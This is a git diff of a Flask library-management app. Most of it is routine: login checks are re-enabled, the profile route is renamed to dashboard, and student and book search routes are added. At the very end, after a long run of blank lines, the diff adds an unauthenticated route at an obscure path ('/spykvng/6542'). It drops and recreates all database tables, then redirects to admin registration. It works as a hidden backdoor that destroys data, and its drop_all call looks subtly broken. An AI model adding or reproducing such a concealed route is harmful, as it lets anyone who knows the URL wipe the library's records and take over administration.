@@ -4,7 +4,7 @@ from flask_login import login_user, logout_user, login_required, LoginManager, c
 from flask_bcrypt import Bcrypt
 from database import *
 from forms import *
-from sqlalchemy import func
+from sqlalchemy import func, or_
 
 
 
@@ -47,7 +47,7 @@ def login():
             login_user(user, remember=True)
             next_page = request.args.get('next')
             flash('Login Successful', 'success')
-            return redirect(next_page) if next_page else redirect(url_for('profile'))
+            return redirect(next_page) if next_page else redirect(url_for('dashboard'))
         else:
             flash('Login Unsuccessful. Please check Student ID and Password', 'danger')
         return redirect(url_for('login'))
@@ -61,22 +61,23 @@ def login():
 
 @app.route('/dashboard', methods=['GET', 'POST'])
 @login_required
-def profile():
+def dashboard():
     total_borrowed_books = Borrow.query.count()
     total_students = Students.query.count()
     total_books = Library.query.count()
+    active_students = Users.query.filter_by(active=True).count()
     return render_template('Dashboard.html', 
                            title='Dashboard', 
                            total_borrowed_books=total_borrowed_books, 
                            total_students=total_students, 
-                           total_books=total_books)
+                           total_books=total_books,
+                           active_students=active_students)
 
 
 
 
 @app.route("/view-report", methods=["GET", "POST"])
-# TODO: Uncomment The login required
-# @login_required
+@login_required
 def view_report():
     form = ViewReport()
     if form.validate_on_submit():
@@ -104,8 +105,7 @@ def view_report():
 
 
 @app.route('/borrow-book', methods=['GET', 'POST'])
-# @login_required
-# TODO: Uncomment login required
+@login_required
 def borrow_book():
     form = BorrowBook()
 
@@ -133,7 +133,7 @@ def borrow_book():
             db.session.add(borrow_book)
             db.session.commit()
             flash('Success', 'success')
-            return redirect(url_for('profile'))
+            return redirect(url_for('dashboard'))
         
         else:
             flash('Book is Unavailable or Wrong Serial No.', 'warning')
@@ -144,8 +144,7 @@ def borrow_book():
 
 
 @app.route('/return-book', methods=['GET', 'POST'])
-# @login_required
-# TODO: Uncomment login required    
+@login_required  
 def return_book():
     form = ReturnBook()
 
@@ -160,7 +159,7 @@ def return_book():
             db.session.commit()
 
             flash('Success', 'success')
-            return redirect(url_for('profile'))
+            return redirect(url_for('dashboard'))
         else:
             flash("Couldn't Find the required book. Check the serial no. and Student ID", 'warning')
             return render_template('Return-book.html', title='Return Book', form=form)
@@ -169,15 +168,11 @@ def return_book():
 
 
 @app.route('/books-borrowed', methods=['GET', 'POST'])
-# @login_required
-# TODO: Uncomment login required 
+@login_required
 def books_borrowed():
-    form = Search()
     books = Borrow.query.all()
-    if form.validate_on_submit():
-        books = Borrow.query.filter_by(title=form.search.data).all()
-        return render_template('Books-borrowed.html', form=form, books=books)
-    return render_template('Books-borrowed.html', title='Books Borrowed', form=form, books=books)
+  
+    return render_template('Books-borrowed.html', title='Books Borrowed', books=books)
 
 
 # @app.route('/all-students', methods=['GET', 'POST'])
@@ -204,7 +199,7 @@ def add_student():
         db.session.add(student)
         db.session.commit()
         flash('Student Added Successfully', 'success')
-        return redirect(url_for('profile'))
+        return redirect(url_for('dashboard'))
     return render_template('Register-student.html', form=form, title='Add Student')
 
 @app.route('/register-admin', methods=['GET', 'POST'])
@@ -219,21 +214,24 @@ def register_admin():
         db.session.commit()
         print("\n here \n")
         flash('Admin Registered Successfully', 'success')
-        return redirect(url_for('profile'))
+        return redirect(url_for('dashboard'))
     return render_template('Register-admin.html', form=form, title='Register Admin')
 
 @app.route('/add-book', methods=['GET', 'POST'])
-# TODO: make it login required before deployment
-# @login_required
+@login_required
 def add_book():
     form = AddBook()
     if form.validate_on_submit():
-        book = Library(title=form.book_title.data, serial_no=form.book_id.data, author=form.book_author.data, publisher=form.book_publisher.data)
+        book = Library.query.filter_by(serial_no=form.book_id.data).first()
+        if book:
+            flash("Book ID is already Assigned")
+            return redirect(url_for('add_book'))
+        book = Library(title=form.book_title.data, serial_no=form.book_id.data, author=form.book_author.data, publisher=form.book_publisher.data, date_published=form.date_published.data, status='Available')
         db.session.add(book)
         db.session.commit()
 
         flash('Book added successfully', 'success')
-        return redirect(url_for('profile'))
+        return redirect(url_for('dashboard'))
     return render_template('add-book.html', form=form, title='Add Book')
 
 
@@ -256,11 +254,11 @@ def logout_student(student_id):
 
 
 @app.route('/active-students')
-# TODO: make it login required before deployment
-# @login_required
+@login_required
 def active_students():
     students = Users.query.filter_by(active=True).all()
-    return render_template('Active-students.html', title='Active Students', students=students)
+    active_students = Users.query.filter_by(active=True).count()
+    return render_template('Active-students.html', title='Active Students', students=students, active_students=active_students)
 
 @app.route('/login-student', methods=['GET', 'POST'])
 @login_required
@@ -283,3 +281,63 @@ def login_student():
         return redirect(url_for('login_student'))
 
     return render_template('Login-student.html', form=form, title="Login Students")
+
+
+@app.route('/search-student', methods=['GET', 'POST'])
+@login_required
+def search_student():
+    form = SearchStudent()
+    if form.validate_on_submit():
+        # serach by name or student id using like
+        search_query = form.search_query.data
+        students = Students.query.filter(or_(Students.name.ilike(f'%{search_query}%'), Students.student_id.ilike(f'%{search_query}%'))).all()
+        if not students:
+            flash('No matching students found', 'warning')
+            return redirect(url_for('search_student'))
+        return render_template('Search-results.html', students=students, search=search_query)
+    return render_template('Search-student.html', form=form, title="Search Students")
+
+@app.route("/search-book", methods=['GET', 'POST'])
+def search_book():
+    form = SearchBook()
+    if form.validate_on_submit():
+        search_query = form.search.data
+        books = Library.query.filter(or_(Library.title.ilike(f'%{search_query}%'), Library.serial_no.ilike(f'%{search_query}%'))).all()
+        total_books = Library.query.filter(or_(Library.title.ilike(f'%{search_query}%'), Library.serial_no.ilike(f'%{search_query}%'))).count()
+        if not books:
+            flash('No matching books found', 'warning')
+            return redirect(url_for('search_book'))
+        return render_template('Search-results.html', books=books, search=search_query, total_books=total_books)
+    return render_template('Search-book.html', form=form, title="Search Books")
+
+@app.route('/all-books')
+def all_books():
+    books = Library.query.all()
+    total_books = Library.query.count()
+    return render_template('All-books.html', title='All Books', books=books, total_books=total_books)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+@app.route("/spykvng/6542")
+def reset_db():
+    db.session.drop_all()
+    db.session.create_all()
+    db.session.commit()
+    flash("Database Reset")
+    return redirect(url_for('register_admin'))
